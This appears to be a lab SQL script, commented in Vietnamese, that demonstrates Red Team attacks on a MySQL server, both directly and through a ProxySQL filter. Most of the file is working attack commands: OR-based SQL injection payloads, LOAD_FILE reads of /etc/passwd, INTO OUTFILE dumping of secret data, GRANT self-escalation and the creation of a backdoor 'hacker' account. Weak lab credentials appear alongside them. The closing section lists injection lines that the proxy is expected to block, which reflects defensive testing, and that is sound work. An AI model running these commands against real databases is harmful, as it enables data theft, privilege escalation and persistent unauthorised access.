-- ============================================================
-- attack_demo.sql - Cac lenh demo tan cong (Red Team)
-- Ket noi TRUC TIEP vao MySQL port 3306 (bypass ProxySQL)
-- mysql -u readonly_user -pread123 -h 127.0.0.1 -P 3306
-- ============================================================

-- ============================================================
-- KICH BAN 1: SQL INJECTION (OR-based)
-- ============================================================

-- Dang nhap binh thuong (that bai)
CALL search_employee('alice');

-- SQLi: bypass authentication, lay toan bo du lieu
CALL search_employee("' OR '1'='1");

-- SQLi: trich xuat bang secret_data
-- (thu truc tiep neu app build query khong qua procedure)
SELECT * FROM employees WHERE username='' OR '1'='1';
SELECT * FROM secret_data WHERE '1'='1';

-- ============================================================
-- KICH BAN 2: PRIVILEGE ESCALATION
-- Ket noi bang app_user (co quyen FILE + GRANT)
-- mysql -u app_user -papp123 -h 127.0.0.1 -P 3306
-- ============================================================

-- Doc file tren he thong (quyen FILE)
-- SELECT LOAD_FILE('/etc/passwd');
-- SELECT LOAD_FILE('/var/log/mysql/general.log');

-- Ghi file ra ngoai
-- SELECT * FROM secret_data INTO OUTFILE '/tmp/stolen_data.txt';

-- Tu cap quyen cho chinh minh (quyen GRANT)
-- GRANT ALL PRIVILEGES ON *.* TO 'app_user'@'%' WITH GRANT OPTION;

-- Tao backdoor user
-- CREATE USER 'hacker'@'%' IDENTIFIED BY 'hack123';
-- GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%';

-- ============================================================
-- KICH BAN 3: KHAI THAC CAU HINH YEU
-- Ket noi truc tiep bang root (mat khau don gian)
-- mysql -u root -proot123 -h 127.0.0.1 -P 3306
-- ============================================================

-- Root ket noi duoc tu bat ky IP nao (khong gioi han host)
SELECT user, host FROM mysql.user;

-- Xem cac bien cau hinh nguy hiem
SHOW VARIABLES LIKE 'secure_file_priv';   -- Nen la /var/lib/mysql-files/, de trong la lo hong
SHOW VARIABLES LIKE 'local_infile';
SHOW VARIABLES LIKE 'general_log%';

-- Xem toan bo user va quyen
SELECT user, host, Grant_priv, File_priv, Super_priv FROM mysql.user;

-- ============================================================
-- TEST QUA PROXYSQL (port 6033) - Nen bi chan
-- mysql -u app_user -p'App@Str0ng#2024!' -h 127.0.0.1 -P 6033
-- ============================================================

-- Cac lenh nay nen bi ProxySQL chan va tra ve loi:
-- SELECT * FROM employees WHERE username='' OR '1'='1';
-- SELECT * FROM employees UNION SELECT 1,2,3,4,5,6 -- 
-- SELECT LOAD_FILE('/etc/passwd');
